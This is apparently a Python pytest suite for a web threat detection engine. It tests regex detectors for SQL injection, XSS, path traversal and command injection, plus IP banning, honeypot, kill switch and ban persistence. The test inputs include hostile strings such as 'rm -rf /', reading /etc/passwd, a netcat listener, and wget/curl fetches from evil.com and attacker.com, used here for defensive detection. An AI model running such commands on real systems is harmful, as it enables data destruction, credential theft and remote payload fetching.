"""
Test Suite: Threat Detection Engine
=====================================
Tests for SQLi/XSS/Path Traversal/CMD Injection detection,
IP banning, DDoS burst detection, honeypot, and kill switch.
"""

import time
import os
import json
import pytest

from backend.threat_detection import (
    SQLI_PATTERNS,
    XSS_PATTERNS,
    PATH_TRAVERSAL,
    CMD_INJECTION,
    MAX_FAILED_LOGINS,
    BAN_DURATIONS,
    ThreatDetectionEngine,
)


# ── Payload Pattern Detection ────────────────────────────────────────────────

class TestSQLiDetection:
    @pytest.mark.parametrize("payload", [
        "' UNION SELECT * FROM users --",
        "1; DROP TABLE users;",
        "admin' OR 1=1 --",
        "SELECT password FROM users",
        "INSERT INTO admin VALUES('hack')",
        "DELETE FROM sessions WHERE 1=1",
    ])
    def test_sqli_patterns_detected(self, payload):
        assert SQLI_PATTERNS.search(payload) is not None

    @pytest.mark.parametrize("safe_input", [
        "normal search query",
        "hello world",
        "user@email.com",
        "my password is strong",
    ])
    def test_safe_inputs_not_flagged_as_sqli(self, safe_input):
        assert SQLI_PATTERNS.search(safe_input) is None


class TestXSSDetection:
    @pytest.mark.parametrize("payload", [
        "<script>alert('xss')</script>",
        "javascript:void(0)",
        '<img onerror="steal()">',
        '<iframe src="evil.com">',
        "document.cookie",
        '<svg onload="alert(1)">',
    ])
    def test_xss_patterns_detected(self, payload):
        assert XSS_PATTERNS.search(payload) is not None

    @pytest.mark.parametrize("safe_input", [
        "I love scripting!",
        "normal paragraph text",
        "<b>bold text</b>",
    ])
    def test_safe_inputs_not_flagged_as_xss(self, safe_input):
        assert XSS_PATTERNS.search(safe_input) is None


class TestPathTraversalDetection:
    @pytest.mark.parametrize("payload", [
        "../../../etc/passwd",
        "..\\..\\windows\\system32",
        "%2e%2e%2f%2e%2e%2fetc/passwd",
        "%252e%252e/secret",
    ])
    def test_path_traversal_detected(self, payload):
        assert PATH_TRAVERSAL.search(payload) is not None

    def test_safe_path_not_flagged(self):
        assert PATH_TRAVERSAL.search("/api/users/123") is None


class TestCmdInjectionDetection:
    @pytest.mark.parametrize("payload", [
        "test; rm -rf /",
        "user && cat /etc/passwd",
        "$(whoami)",
        "`id`",
        "nc -lvnp 4444",
        "wget http://evil.com/shell.sh",
        "curl http://attacker.com/payload",
    ])
    def test_cmd_injection_detected(self, payload):
        assert CMD_INJECTION.search(payload) is not None

    def test_safe_command_not_flagged(self):
        assert CMD_INJECTION.search("normal api request") is None


# ── IP Banning ───────────────────────────────────────────────────────────────

class TestIPBanning:
    def test_ip_not_banned_initially(self, fresh_threat_engine):
        banned, remaining = fresh_threat_engine.is_ip_banned("192.168.1.1")
        assert banned is False
        assert remaining is None

    def test_ban_after_max_failed_logins(self, fresh_threat_engine):
        ip = "10.0.0.1"
        for i in range(MAX_FAILED_LOGINS):
            result = fresh_threat_engine.record_failed_login(ip)
        # After MAX_FAILED_LOGINS failures, IP should be banned
        assert result is True
        banned, remaining = fresh_threat_engine.is_ip_banned(ip)
        assert banned is True
        assert remaining is not None
        assert remaining > 0

    def test_not_banned_before_max_failures(self, fresh_threat_engine):
        ip = "10.0.0.2"
        for i in range(MAX_FAILED_LOGINS - 1):
            result = fresh_threat_engine.record_failed_login(ip)
        assert result is False
        banned, _ = fresh_threat_engine.is_ip_banned(ip)
        assert banned is False

    def test_escalating_ban_durations(self, fresh_threat_engine):
        ip = "10.0.0.3"
        # First ban
        for _ in range(MAX_FAILED_LOGINS):
            fresh_threat_engine.record_failed_login(ip)
        banned, remaining1 = fresh_threat_engine.is_ip_banned(ip)
        assert banned is True
        # First ban duration should be ~ BAN_DURATIONS[0] (1 hour)
        assert remaining1 <= BAN_DURATIONS[0]
        assert remaining1 > BAN_DURATIONS[0] - 5  # Within 5 seconds

    def test_unblock_ip(self, fresh_threat_engine):
        ip = "10.0.0.4"
        # Ban the IP
        for _ in range(MAX_FAILED_LOGINS):
            fresh_threat_engine.record_failed_login(ip)
        banned, _ = fresh_threat_engine.is_ip_banned(ip)
        assert banned is True
        # Unblock
        result = fresh_threat_engine.unblock_ip(ip)
        assert result is True
        banned, _ = fresh_threat_engine.is_ip_banned(ip)
        assert banned is False

    def test_unblock_nonexistent_ip(self, fresh_threat_engine):
        result = fresh_threat_engine.unblock_ip("99.99.99.99")
        assert result is False

    def test_get_blocked_ips_list(self, fresh_threat_engine):
        ip = "10.0.0.5"
        for _ in range(MAX_FAILED_LOGINS):
            fresh_threat_engine.record_failed_login(ip)
        blocked = fresh_threat_engine.get_blocked_ips()
        assert len(blocked) >= 1
        assert any(b["ip"] == ip for b in blocked)

    def test_successful_login_clears_failures(self, fresh_threat_engine):
        ip = "10.0.0.6"
        # 4 failures (one below ban threshold)
        for _ in range(MAX_FAILED_LOGINS - 1):
            fresh_threat_engine.record_failed_login(ip)
        # Successful login
        fresh_threat_engine.record_successful_login(ip)
        # One more failure shouldn't trigger ban now
        result = fresh_threat_engine.record_failed_login(ip)
        assert result is False


# ── Payload Inspection (Full Pipeline) ───────────────────────────────────────

class TestPayloadInspection:
    def test_sqli_detected_and_ip_banned(self, fresh_threat_engine):
        result = fresh_threat_engine.inspect_payload(
            "10.0.0.10", "/api/users", query="id=1 UNION SELECT * FROM users"
        )
        assert result == "SQL_INJECTION"
        banned, _ = fresh_threat_engine.is_ip_banned("10.0.0.10")
        assert banned is True

    def test_xss_detected_and_ip_banned(self, fresh_threat_engine):
        result = fresh_threat_engine.inspect_payload(
            "10.0.0.11", "/api/comment", body="<script>alert('xss')</script>"
        )
        assert result == "XSS"
        banned, _ = fresh_threat_engine.is_ip_banned("10.0.0.11")
        assert banned is True

    def test_path_traversal_detected(self, fresh_threat_engine):
        result = fresh_threat_engine.inspect_payload(
            "10.0.0.12", "/api/../../etc/passwd"
        )
        assert result == "PATH_TRAVERSAL"

    def test_cmd_injection_detected(self, fresh_threat_engine):
        result = fresh_threat_engine.inspect_payload(
            "10.0.0.13", "/api/ping", query="host=127.0.0.1; cat /etc/passwd"
        )
        assert result == "CMD_INJECTION"

    def test_clean_request_returns_none(self, fresh_threat_engine):
        result = fresh_threat_engine.inspect_payload(
            "10.0.0.14", "/api/dashboard", query="page=1"
        )
        assert result is None

    def test_payload_hits_recorded(self, fresh_threat_engine):
        fresh_threat_engine.inspect_payload("10.0.0.15", "/api", body="<script>x</script>")
        hits = fresh_threat_engine.get_payload_hits()
        assert len(hits) >= 1
        assert hits[0]["type"] == "XSS"


# ── DDoS Burst Detection ────────────────────────────────────────────────────

class TestDDoSDetection:
    def test_normal_traffic_not_flagged(self, fresh_threat_engine):
        result = fresh_threat_engine.check_ddos("10.0.0.20")
        assert result is False

    def test_burst_memory_cap(self, fresh_threat_engine):
        """Verify the anti-memory exhaustion check works for many unique IPs."""
        for i in range(100):
            fresh_threat_engine.check_ddos(f"192.168.{i // 256}.{i % 256}")
        # Should not crash or consume excessive memory


# ── Honeypot ─────────────────────────────────────────────────────────────────

class TestHoneypot:
    def test_honeypot_hit_bans_ip(self, fresh_threat_engine):
        fresh_threat_engine.record_honeypot_hit("10.0.0.30", "/admin/config.php")
        banned, _ = fresh_threat_engine.is_ip_banned("10.0.0.30")
        assert banned is True

    def test_honeypot_hits_recorded(self, fresh_threat_engine):
        fresh_threat_engine.record_honeypot_hit("10.0.0.31", "/.env", "Mozilla/5.0")
        hits = fresh_threat_engine.get_honeypot_hits()
        assert len(hits) >= 1
        assert hits[0]["ip"] == "10.0.0.31"
        assert hits[0]["path"] == "/.env"

    def test_honeypot_stats(self, fresh_threat_engine):
        fresh_threat_engine.record_honeypot_hit("10.0.0.32", "/wp-admin")
        fresh_threat_engine.record_honeypot_hit("10.0.0.32", "/phpmyadmin")
        fresh_threat_engine.record_honeypot_hit("10.0.0.33", "/wp-admin")
        stats = fresh_threat_engine.get_honeypot_stats()
        assert stats["total_hits"] == 3
        assert stats["unique_attacker_ips"] == 2


# ── Kill Switch ──────────────────────────────────────────────────────────────

class TestKillSwitch:
    def test_kill_switch_initially_off(self, fresh_threat_engine):
        assert fresh_threat_engine.kill_switch_active is False

    def test_activate_kill_switch(self, fresh_threat_engine):
        fresh_threat_engine.activate_kill_switch()
        assert fresh_threat_engine.kill_switch_active is True

    def test_kill_switch_threat_score_100(self, fresh_threat_engine):
        fresh_threat_engine.activate_kill_switch()
        score = fresh_threat_engine.calculate_threat_score()
        assert score["threat_score"] == 100
        assert score["level"] == "critical"
        assert score["kill_switch_active"] is True

    def test_deactivate_kill_switch(self, fresh_threat_engine):
        fresh_threat_engine.activate_kill_switch()
        fresh_threat_engine.deactivate_kill_switch()
        assert fresh_threat_engine.kill_switch_active is False


# ── Ban Persistence ──────────────────────────────────────────────────────────

class TestBanPersistence:
    def test_bans_saved_to_file(self, fresh_threat_engine):
        ban_file = os.environ.get("BAN_STATE_FILE", "/tmp/brahmastra_test_bans.json")
        ip = "10.0.0.40"
        for _ in range(MAX_FAILED_LOGINS):
            fresh_threat_engine.record_failed_login(ip)
        # File should exist and contain the banned IP
        assert os.path.exists(ban_file)
        with open(ban_file) as f:
            data = json.load(f)
        assert ip in data
        assert data[ip]["ban_until"] > time.time()
